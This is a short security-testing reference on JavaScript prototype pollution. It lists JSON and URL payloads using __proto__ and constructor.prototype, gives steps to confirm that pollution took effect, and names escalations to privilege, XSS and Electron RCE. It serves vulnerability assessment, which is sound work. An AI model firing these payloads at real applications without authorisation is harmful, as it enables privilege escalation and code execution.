# Prototype pollution payloads

Targets: recursive merges (`_.merge`, `$.extend`, `Object.assign` chains,
custom `mergeDeep`), `JSON.parse` results merged into objects, query-string /
hash parsers that build objects.

## The canonical payloads

JSON body / message payload:

```json
{"__proto__": {"isAdmin": true}}
```

```json
{"constructor": {"prototype": {"polluted": 1}}}
```

Nested (survives shallow merge filters):

```json
{"a": {"__proto__": {"polluted": 1}}}
```

URL / hash based (targets libraries that parse `location.search` /
`location.hash` into objects):

```
?__proto__[polluted]=1
#__proto__[polluted]=1
?constructor[prototype][polluted]=1
```

## How to confirm pollution, not just a crash

The finding needs proof the polluting key actually lands on the prototype:

1. Feed the payload through the sink (merge / parse / param parser).
2. Check for the side effect: `({}).polluted === 1` in the app's own context,
   or an observable behavior change (e.g. `isAdmin` truthy check flips).
3. If the library strips `__proto__` (many modern ones do), the payload is
   inert — downgrade to INFO ("defense-in-depth, no reachable sink") or N/A.

## Impact escalations worth checking

- Property set on `Object.prototype` that the app reads with a truthy check
  (`if (opts.isAdmin)`) → privilege.
- `Object.prototype` gets `src`/`innerHTML`-style keys used by rendering
  code → XSS.
- Polluting a key consumed by an option object passed to a dangerous API
  (`shell.openExternal`, `new Function`) → RCE surface in Electron.

## Fix reference

See `fixes/safe-merge.md` for the drop-in safe merge and hardened
`JSON.parse` pattern.
